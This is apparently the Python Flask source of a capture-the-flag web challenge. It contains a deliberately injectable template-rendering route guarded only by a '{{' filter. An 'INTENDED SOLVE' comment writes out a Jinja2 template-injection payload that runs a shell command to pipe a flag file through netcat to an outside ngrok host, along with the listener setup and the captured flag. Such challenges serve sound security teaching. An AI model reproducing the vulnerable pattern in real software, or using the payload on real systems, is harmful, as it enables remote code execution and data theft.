#!/usr/bin/env python3

import requests
from flask import Flask, request, abort, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sqlite3

app = Flask(__name__)
limiter = Limiter(app, key_func=get_remote_address)

newpost = '''
<h2>Create A New Post</h2>
<p>This page is under development. Currently only you will be able to preview the post.</p>
<b>Note: Apologies to our users for the data breach. We've reviewed and code and fixed the vulnerability!</b>
<form action="/submit" name="postForm" method="post">
    <textarea id="confirmationText" class="text" cols="86" rows ="20" name="postForm"></textarea>
    <br>
    <input type="submit" value="Preview Post" >
</form>
'''

mainpage = '''
<h2>Main Page</h2>
<p>Welcome to our site! Currently we're using this framework called Flask that uses a template engine called Jinja2!</p>
<a href="/newpost">Make a new post</a> 
'''

blocklist = '''
<h2>Hacker detected! '{{' not allowed!</h2>
<iframe src="https://giphy.com/embed/yUlFNRDWVfxCM" width="480" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/ncis-hacking-double-keyboard-yUlFNRDWVfxCM">via GIPHY</a></p>
'''

# INTENDED SOLVE
# bypass {{ by using an if statement
# nc -lnvp 8080
# ./ngrok tcp 8080
# {% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /home/flag.txt | nc 8.tcp.ngrok.io 17118')['read']() %} a {% endif %}
#Listening on 0.0.0.0 8080
# Connection received on 127.0.0.1 43024
# sectalks{filters-are-meant-to-be-bypassed!}

@app.route('/')
def indexpage():
  return mainpage
  
@app.route('/newpost')
def newpostpage():
  return newpost

@app.route('/submit', methods=['POST'])
@limiter.limit("10/minute") 
def submitpage():
    try:
        message = request.form['postForm']
        if '{{' in message:
            return blocklist
        template = '''message preview: {}'''.format(message)
        return render_template_string(message)
    except:
        return 'Error!'

app.run(host='0.0.0.0', port=5005, threaded=True)








